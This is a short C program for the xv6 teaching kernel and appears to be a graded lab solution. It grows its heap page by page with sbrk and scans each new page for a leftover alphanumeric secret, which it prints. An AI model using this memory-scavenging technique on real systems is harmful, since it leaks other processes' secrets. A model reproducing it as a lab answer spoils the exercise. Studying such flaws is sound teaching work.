#include "kernel/types.h"
#include "kernel/stat.h"
#include "user/user.h"
#include "kernel/riscv.h"   // For PGSIZE

// Total maximum memory to allocate (16MB).
#define MAX_ALLOC_TOTAL (16 * 1024 * 1024)
#define MAX_SECRET_LEN 50

// Helper: alphanumeric check
int is_valid_secret_char(char c) {
  return (c >= 'a' && c <= 'z') ||
         (c >= 'A' && c <= 'Z') ||
         (c >= '0' && c <= '9');
}

int
main(int argc, char *argv[])
{
  char *p;
  int i;
  int total_allocated = 0;

  while (total_allocated < MAX_ALLOC_TOTAL) {
    // allocate one page; sbrk() returns start of the new region
    p = sbrk(PGSIZE);
    if (p == (char*)-1) {
      fprintf(2, "attack: sbrk failed at %d bytes\n", total_allocated);
      break;
    }
    total_allocated += PGSIZE;

    // scan the page
    for (i = 0; i < PGSIZE; i++) {
      char *current_byte = p + i;
      int len = 0;

      if (!is_valid_secret_char(*current_byte))
        continue;

      while (len < MAX_SECRET_LEN) {
        char c = current_byte[len];
        if (c == '\0') {
          if (len > 0) {
            printf("%s\n", current_byte);
            exit(0);
          }
          break; // empty string
        }
        if (!is_valid_secret_char(c))
          break;
        len++;
      }
    }
  }
  // let the grader's second run try again
  exit(0);
}
